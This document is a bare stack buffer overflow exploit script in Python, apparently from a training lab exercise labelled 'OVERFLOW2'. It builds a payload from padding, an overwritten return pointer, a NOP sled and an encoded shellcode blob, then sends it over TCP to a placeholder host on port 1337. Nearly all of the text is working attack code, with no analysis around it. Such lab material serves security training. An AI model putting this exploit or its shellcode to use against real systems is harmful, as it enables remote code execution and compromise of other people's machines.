# Buffer overflow 2

```text
#!/usr/bin/env python3
import socket

ip = "KALI_IP"
port = 1337

buf_length = 1100
prefix = "OVERFLOW2 "
offset = 634
sled = "\x90" * 16

buffer = ""
buffer += prefix						# prefix
buffer += "A" * (offset)				# padding
buffer += "\xaf\x11\x50\x62"			# overwriting the saved return pointer
buffer += sled							# NOP sled
buffer += ("\xfc\xbb\x1f\x97\xec\x8c\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
	"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xe3\x7f\x6e\x8c\x1b"
	"\x80\x0f\x04\xfe\xb1\x0f\x72\x8b\xe2\xbf\xf0\xd9\x0e\x4b\x54"
	"\xc9\x85\x39\x71\xfe\x2e\xf7\xa7\x31\xae\xa4\x94\x50\x2c\xb7"
	"\xc8\xb2\x0d\x78\x1d\xb3\x4a\x65\xec\xe1\x03\xe1\x43\x15\x27"
	"\xbf\x5f\x9e\x7b\x51\xd8\x43\xcb\x50\xc9\xd2\x47\x0b\xc9\xd5"
	"\x84\x27\x40\xcd\xc9\x02\x1a\x66\x39\xf8\x9d\xae\x73\x01\x31"
	"\x8f\xbb\xf0\x4b\xc8\x7c\xeb\x39\x20\x7f\x96\x39\xf7\xfd\x4c"
	"\xcf\xe3\xa6\x07\x77\xcf\x57\xcb\xee\x84\x54\xa0\x65\xc2\x78"
	"\x37\xa9\x79\x84\xbc\x4c\xad\x0c\x86\x6a\x69\x54\x5c\x12\x28"
	"\x30\x33\x2b\x2a\x9b\xec\x89\x21\x36\xf8\xa3\x68\x5f\xcd\x89"
	"\x92\x9f\x59\x99\xe1\xad\xc6\x31\x6d\x9e\x8f\x9f\x6a\xe1\xa5"
	"\x58\xe4\x1c\x46\x99\x2d\xdb\x12\xc9\x45\xca\x1a\x82\x95\xf3"
	"\xce\x05\xc5\x5b\xa1\xe5\xb5\x1b\x11\x8e\xdf\x93\x4e\xae\xe0"
	"\x79\xe7\x45\x1b\xea\xc8\x32\x53\x6a\xa0\x40\x93\x6b\x8a\xcc"
	"\x75\x01\xfc\x98\x2e\xbe\x65\x81\xa4\x5f\x69\x1f\xc1\x60\xe1"
	"\xac\x36\x2e\x02\xd8\x24\xc7\xe2\x97\x16\x4e\xfc\x0d\x3e\x0c"
	"\x6f\xca\xbe\x5b\x8c\x45\xe9\x0c\x62\x9c\x7f\xa1\xdd\x36\x9d"
	"\x38\xbb\x71\x25\xe7\x78\x7f\xa4\x6a\xc4\x5b\xb6\xb2\xc5\xe7"
	"\xe2\x6a\x90\xb1\x5c\xcd\x4a\x70\x36\x87\x21\xda\xde\x5e\x0a"
	"\xdd\x98\x5e\x47\xab\x44\xee\x3e\xea\x7b\xdf\xd6\xfa\x04\x3d"
	"\x47\x04\xdf\x85\x67\xe7\xf5\xf3\x0f\xbe\x9c\xb9\x4d\x41\x4b"
	"\xfd\x6b\xc2\x79\x7e\x88\xda\x08\x7b\xd4\x5c\xe1\xf1\x45\x09"
	"\x05\xa5\x66\x18\x05\x49\x99\xa3")			# shellcode
buffer += "D" * (buf_length - (len(buffer) - len(prefix)))	# trail padding
buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((ip, port))
	print("[+] Sending evil buffer of {} bytes...".format((len(buffer) - len(prefix) - 2)))
	s.send(bytes(buffer, "latin-1"))
	print("[+] Done!")
except:
	print("[-] Could not connect.")
```